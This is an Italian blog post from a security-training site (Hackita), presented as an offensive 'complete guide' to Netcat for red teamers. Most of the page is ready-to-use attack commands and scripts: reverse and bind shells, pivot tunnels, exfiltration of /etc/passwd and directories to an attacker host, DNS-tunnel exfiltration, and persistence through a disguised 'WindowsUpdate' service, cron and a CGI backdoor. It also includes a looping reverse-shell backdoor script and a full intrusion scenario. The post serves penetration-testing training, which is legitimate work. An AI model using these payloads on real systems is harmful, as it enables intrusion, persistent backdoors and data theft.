---
title: 'Netcat: il coltellino svizzero dell’hacking di rete'
description: >-
  Scopri come usare Netcat per exploit, backdoor e port scanning. Guida tecnica
  per red teamer e hacker etici. Comandi reali ed esempi pratici.
image: /netcat.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - netcat
  - nc
slug: "netcat"
---

# Netcat: Il Coltellino Svizzero dell'Attaccante - Guida Offensiva Completa

**Report Red Team | Ambiente Controllato Autorizzato**

Netcat non è solo un tool. È un'estensione della tua volontà nella rete. Quando tutto il resto fallisce, quando i tool moderni vengono bloccati, quando hai bisogno di una connessione raw e diretta - Netcat è lì. Questa è la guida che avrei voluto avere quando ho iniziato. Non teoria asettica, ma **tecniche offensive reali** che funzionano in ambienti controllati.

## Introduzione Offensiva: Perché Netcat è Immortale

Netcat è soprannominato "il coltellino svizzero della rete" per una ragione precisa: **fa una cosa sola (trasferisce dati attraverso connessioni TCP/UDP) ma lo fa così bene da poter sostituire dozzine di tool specializzati**. In una operazione di Red Team, Netcat diventa:

* Il tuo **scanner di porte** quando Nmap è bloccato
* Il tuo **canale di comando** quando le reverse shell complesse vengono rilevate
* Il tuo **tunnel** attraverso firewall restrittivi
* Il tuo **exfiltration tool** per dati sensibili
* La tua **backdoor persistente** in sistemi legacy

```bash
# Verifica della presenza di Netcat
which nc
which netcat
which ncat

# Output tipico su Kali:
/usr/bin/nc
/usr/bin/netcat
/usr/bin/ncat
```

## Installazione e Varianti: Scegliere l'Arma Giusta

Su Kali, Netcat è preinstallato in tre varianti principali. Ognuna ha i suoi usi specifici:

```bash
# 1. Netcat tradizionale (BSD) - La versione classica
nc -h

# 2. Ncat (da Nmap project) - Con più funzionalità
ncat -h

# 3. Netcat OpenBSD - Più sicuro, meno feature
nc.traditional -h
```

**Per scopi offensivi, Ncat è spesso la scelta migliore** per le sue funzionalità avanzate (crittografia, proxy, multipli connection mode).

## Fase 1: Ricognizione Offensiva con Netcat

### Scan di Porte Silenzioso

Quando gli scanner tradizionali vengono rilevati, Netcat può fare scansioni discrete:

```bash
# Scan TCP di una singola porta
nc -zv 192.168.1.10 80

# Output:
Connection to 192.168.1.10 80 port [tcp/http] succeeded!

# Scan di un range di porte
for port in {1..1000}; do
    nc -zv 192.168.1.10 $port 2>&1 | grep succeeded
done

# Script avanzato per scan TCP
#!/bin/bash
target="192.168.1.10"
timeout=1
echo "[*] Scanning $target"

for port in $(seq 1 10000); do
    (nc -z -w $timeout $target $port 2>/dev/null && echo "[+] Port $port is OPEN") &
done
wait
```

### Banner Grabbing - Identificazione dei Servizi

Una volta trovate porte aperte, identifichiamo i servizi:

```bash
# Banner grabbing su porta HTTP
echo -e "GET / HTTP/1.0\r\n\r\n" | nc -nv 192.168.1.10 80

# Output:
HTTP/1.1 200 OK
Date: Wed, 15 May 2024 14:30:00 GMT
Server: Apache/2.4.41 (Ubuntu)
...

# Banner grabbing su porta SSH
nc -nv 192.168.1.10 22

# Output:
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
```

## Fase 2: Stabilire l'Accesso - Shell e Backdoor

### Reverse Shell - Il Cavallo di Troia Moderno

La tecnica più comune per ottenere accesso a un sistema compromesso:

```bash
# Sull'attaccante (in ascolto)
nc -nlvp 4444

# Sulla vittima (Windows)
nc.exe -nv 192.168.1.100 4444 -e cmd.exe

# Sulla vittima (Linux)
nc 192.168.1.100 4444 -e /bin/bash

# Varianti alternative per Linux:
# 1. Con /dev/tcp (built-in bash)
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# 2. Con python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Bind Shell - Quando la Vittima Ascolta

In alcuni scenari, è più efficace fare in modo che la vittima apra una porta:

```bash
# Sulla vittima (apre la shell in ascolto)
nc -nlvp 5555 -e /bin/bash

# Sull'attaccante (si connette alla vittima)
nc -nv 192.168.1.10 5555
```

### Shell Stabilizzazione - Da Semplice a Interattiva

Le shell Netcat di base sono spesso instabili. Ecco come stabilizzarle:

```bash
# Metodo 1: Usare python per TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Metodo 2: Upgrade completo della shell
# Step 1: Nell'attaccante, prima di connettersi
stty raw -echo
fg

# Step 2: Nella shell della vittima
export TERM=xterm
export SHELL=bash
stty rows 50 columns 132

# Metodo 3: Con script
# Sulla vittima:
script -qc /bin/bash /dev/null
```

## Fase 3: Movimento Laterale e Pivoting

### Tunnel TCP - Attraversare le Reti

Netcat può creare tunnel attraverso host compromessi:

```bash
# Scenario: Attaccante (A) -> Host Compromesso (B) -> Target Interno (C)

# Sull'Host B (pivot):
nc -lvp 8080 -c "nc 192.168.2.100 3389"

# Sull'Attaccante A:
nc -nv 192.168.1.10 8080

# Ora l'attaccante può interagire con il servizio RDP su 192.168.2.100:3389
```

### Port Forwarding Multiplex

Tunnel più sofisticati con pipe named:

```bash
# Creazione di un proxy SOCKS semplice con Netcat
mkfifo /tmp/fifo
nc -lvp 1080 < /tmp/fifo | nc 192.168.2.100 3389 > /tmp/fifo
```

## Fase 4: Esfiltrazione Dati e Trasferimento File

### Download di File dalla Vittima

```bash
# Sull'attaccante (in ascolto per ricevere file):
nc -nlvp 4444 > file_rubato.zip

# Sulla vittima (invia file):
nc -nv 192.168.1.100 4444 < /etc/passwd

# Per directory complete:
tar czf - /etc/ | nc -nv 192.168.1.100 4444
```

### Upload di Tool sulla Vittima

```bash
# Sull'attaccante (invia file):
nc -nlvp 4444 < exploit.exe

# Sulla vittima (riceve file):
nc -nv 192.168.1.100 4444 > exploit.exe
```

### Esfiltrazione Stealth con DNS Tunnel (Concettuale)

```bash
# Tecnica avanzata: codificare dati in query DNS
# Attaccante in ascolto su porta 53 UDP
nc -l -u -p 53 | while read line; do
    # Decodifica dati dalle query DNS
    echo $line | base64 -d
done

# Vittima invia dati via DNS
cat secret.txt | base64 | while read chunk; do
    dig @192.168.1.100 $chunk.example.com
done
```

## Fase 5: Tecniche Avanzate di Evasione

### Netcat Criptato con Ncat

```bash
# Server con SSL
ncat --ssl -lvp 443 -e /bin/bash

# Client con SSL
ncat --ssl 192.168.1.10 443

# Con certificato personalizzato
ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 443
```

### Netcat attraverso Proxy

```bash
# Connessione attraverso HTTP proxy
nc -X connect -x proxy.company.com:8080 192.168.1.10 22

# Connessione attraverso SOCKS proxy
nc -X 5 -x socks5://192.168.1.50:1080 10.0.0.10 3389
```

### Timing e Retry Automatici

```bash
# Connessione con timeout e retry
nc -zv -w 5 -i 10 192.168.1.10 22

# w = timeout in secondi
# i = intervallo tra tentativi
```

## Fase 6: Backdoor Persistenti e Persistenza

### Netcat come Servizio Windows

```bash
# Creare servizio Windows con Netcat
sc create "WindowsUpdate" binPath= "C:\nc.exe -nv 192.168.1.100 4444 -e cmd.exe" start= auto

# Alternative con schtasks (Task Scheduler)
schtasks /create /tn "Cleanup" /tr "C:\nc.exe 192.168.1.100 4444 -e cmd.exe" /sc daily /st 00:00
```

### Netcat con Auto-Restart (Linux)

```bash
# Script di persistenza per Linux
#!/bin/bash
while true; do
    nc -nlvp 4444 -e /bin/bash
    sleep 10
done

# Aggiungere a crontab per persistenza
(crontab -l 2>/dev/null; echo "@reboot sleep 60 && /tmp/persistent_nc.sh") | crontab -
```

### Web Shell con Netcat

```bash
# Netcat come CGI backdoor
# File: /var/www/html/backdoor.cgi
#!/bin/bash
echo "Content-type: text/html"
echo ""
nc -nv 192.168.1.100 4444 -e /bin/bash

# Accessibile via: http://victim.com/backdoor.cgi
```

## Scenario di Attacco Completo: Dalla Ricognizione al Dominio

**Contesto**: Accesso iniziale a una DMZ, obiettivo è raggiungere la rete interna.

**Step 1 - Ricognizione della DMZ:**

```bash
# Scan veloce delle porte principali
for port in 21 22 23 80 443 445 3389; do
    nc -zv -w 1 192.168.1.10 $port 2>&1 | grep succeeded
done
```

**Step 2 - Compromissione del primo host:**

```bash
# Trovata porta 80 aperta, vulnerabile a RCE
# Dopo exploit, carica Netcat sulla vittima
wget http://192.168.1.100/nc -O /tmp/nc
chmod +x /tmp/nc
```

**Step 3 - Reverse shell verso l'attaccante:**

```bash
# Sulla vittima
/tmp/nc -nv 192.168.1.100 4444 -e /bin/bash

# Sull'attaccante
nc -nlvp 4444
```

**Step 4 - Pivot verso la rete interna:**

```bash
# Sull'host compromesso (DMZ)
# Scansione della rete interna
for i in {1..254}; do
    nc -zv -w 1 10.0.0.$i 445 2>&1 | grep succeeded &
done

# Trovato DC a 10.0.0.10
```

**Step 5 - Tunnel per raggiungere il DC:**

```bash
# Sull'host DMZ creiamo tunnel
mkfifo /tmp/dcpipe
nc -lvp 33890 < /tmp/dcpipe | nc 10.0.0.10 3389 > /tmp/dcpipe

# Sull'attaccante ci connettiamo al tunnel
rdesktop 192.168.1.10:33890
```

**Step 6 - Esfiltrazione dati:**

```bash
# Dump del database dal DC
sqlcmd -S localhost -Q "BACKUP DATABASE [HR] TO DISK = '/tmp/hr.bak'"

# Compressione e invio via Netcat
tar czf - /tmp/hr.bak | /tmp/nc -nv 192.168.1.100 5555
```

## Automazione Offensiva con Script Netcat

### Scanner di Rete Avanzato

```python
#!/usr/bin/env python3
"""
Advanced Network Scanner with Netcat
Per uso esclusivo in ambienti controllati autorizzati
"""

import subprocess
import threading
from queue import Queue
import ipaddress

class NetcatOffensiveScanner:
    def __init__(self, target_network, ports=[21,22,23,80,443,445,3389]):
        self.target_network = target_network
        self.ports = ports
        self.open_ports = {}
        self.queue = Queue()
    
    def scan_port(self, ip, port):
        """Scansione singola porta con Netcat"""
        try:
            cmd = f"nc -zv -w 1 {ip} {port} 2>&1"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=2)
            
            if "succeeded" in result.stdout:
                if ip not in self.open_ports:
                    self.open_ports[ip] = []
                self.open_ports[ip].append(port)
                print(f"[+] {ip}:{port} - OPEN")
                
                # Banner grabbing automatico
                self.banner_grab(ip, port)
                
        except Exception as e:
            pass
    
    def banner_grab(self, ip, port):
        """Tentativo di banner grabbing"""
        try:
            if port == 80:
                cmd = f"echo -e 'GET / HTTP/1.0\\r\\n\\r\\n' | timeout 2 nc {ip} {port}"
            elif port == 22:
                cmd = f"timeout 2 nc {ip} {port}"
            else:
                cmd = f"timeout 2 nc {ip} {port}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.stdout:
                print(f"    Banner: {result.stdout[:100]}...")
        except:
            pass
    
    def worker(self):
        """Worker thread per scansioni parallele"""
        while True:
            item = self.queue.get()
            if item is None:
                break
            ip, port = item
            self.scan_port(ip, port)
            self.queue.task_done()
    
    def scan_network(self):
        """Scansione completa della rete"""
        print(f"[*] Starting offensive scan of {self.target_network}")
        
        # Genera tutti gli IP
        network = ipaddress.ip_network(self.target_network)
        targets = [str(ip) for ip in network.hosts()]
        
        # Riempi la queue
        for ip in targets:
            for port in self.ports:
                self.queue.put((ip, port))
        
        # Avvia worker threads
        threads = []
        for _ in range(50):  # 50 thread concorrenti
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        
        # Attendi completamento
        self.queue.join()
        
        # Ferma i worker
        for _ in range(50):
            self.queue.put(None)
        for t in threads:
            t.join()
        
        return self.open_ports

# Utilizzo
if __name__ == "__main__":
    scanner = NetcatOffensiveScanner("192.168.1.0/24")
    results = scanner.scan_network()
    
    print("\n[+] SCAN RESULTS:")
    for ip, ports in results.items():
        print(f"{ip}: {ports}")
```

### Reverse Shell Multi-Thread

```bash
#!/bin/bash
# persistent_reverse_shell.sh
# Backdoor con multiple fallback e auto-restart

ATTACKER_IP="192.168.1.100"
PORTS=(4444 5555 6666 7777)
SLEEP_TIME=30

while true; do
    for PORT in "${PORTS[@]}"; do
        echo "[*] Trying reverse shell to $ATTACKER_IP:$PORT"
        nc -nv $ATTACKER_IP $PORT -e /bin/bash
        
        if [ $? -eq 0 ]; then
            echo "[+] Connected successfully"
            exit 0
        fi
        
        echo "[-] Connection failed, trying next port..."
        sleep 5
    done
    
    echo "[*] All connections failed, retrying in $SLEEP_TIME seconds..."
    sleep $SLEEP_TIME
done
```

## Considerazioni Finali per l'Operatore Offensivo

Netcat rimane uno strumento fondamentale per tre ragioni principali:

1. **Ubiquità**: Presente o compilabile su quasi tutti i sistemi
2. **Semplicità**: Niente dipendenze, funziona sempre
3. **Flessibilità**: Può sostituire dozzine di tool specializzati

**Le 5 Regole d'Oro dell'Attaccante con Netcat:**

1. **Know Your Variants**: Usa Ncat per funzionalità avanzate, Netcat tradizionale per compatibilità
2. **Always Stabilize**: Una shell Netcat base muore spesso - stabilizzala immediatamente
3. **Encrypt When Possible**: Usa SSL/TLS con Ncat per evitare sniffing
4. **Have Fallbacks**: Setup multiple reverse shell con porte diverse
5. **Clean Up**: Rimuovi Netcat e i tuoi file dopo l'operazione

**Limiti e Alternative Moderne:**

* Netcat non cripta il traffico di default (usa Ncat con SSL)
* Le shell Netcat sono spesso rilevate dagli EDR moderni
* Per operazioni prolungate, considerare tool come Meterpreter o Cobalt Strike
* Per tunnel complessi, meglio usare Chisel o SOCAT

***

### Pronto a Padroneggiare le Tecniche Offensive Reali?

Questa guida mostra solo la superficie delle possibilità con strumenti "semplici" come Netcat. In un'operazione reale di Red Team, ogni tool deve essere usato nel contesto giusto, con tecniche di evasione appropriate e una profonda comprensione dei meccanismi di difesa.

**Hackita** offre la formazione che serve per eccellere nella sicurezza offensiva:

* **Corsi di Red Teaming Avanzato**: Impara a condurre operazioni complete, dalla ricognizione alla post-exploitation
* **Laboratori Pratici**: Ambienti controllati che replicano reti aziendali reali
* **Mentorship 1:1**: Sessioni personalizzate con professionisti del settore
* **Formazione Aziendale**: Programmi su misura per team di sicurezza

**I nostri percorsi formativi includono:**

* Tecniche di evasione degli EDR/AV
* Post-exploitation avanzato
* Movement laterale in ambienti Active Directory
* Esfiltrazione dati stealth
* Scrittura di tool personalizzati

[Scopri i nostri servizi formativi](https://hackita.it/servizi/) e inizia il tuo percorso per diventare un operatore di sicurezza offensiva certificato.

**Supporta la Community:**
La conoscenza va condivisa. [Supporta il nostro progetto con una donazione](https://hackita.it/supporto/) per aiutarci a mantenere i laboratori, creare nuovi contenuti e organizzare eventi per la community.

**Risorse Consigliate:**

* [Ncat User Guide - Nmap Project](https://nmap.org/ncat/guide/)
* [Netcat Manual - GNU](https://www.gnu.org/software/netcat/manual/netcat.html)
* [Red Team Field Manual](http://www.amazon.com/dp/1494295504)
* [Pentester Academy - Netcat Course](https://www.pentesteracademy.com/course?id=11)

**Ricorda:** Queste tecniche devono essere utilizzate solo in ambienti controllati, con autorizzazione esplicita, a scopo di apprendimento e miglioramento delle difese.

**Formati. Sperimenta. Previeni.**

[Hackita - Excellence in Offensive Security Training](https://hackita.it)
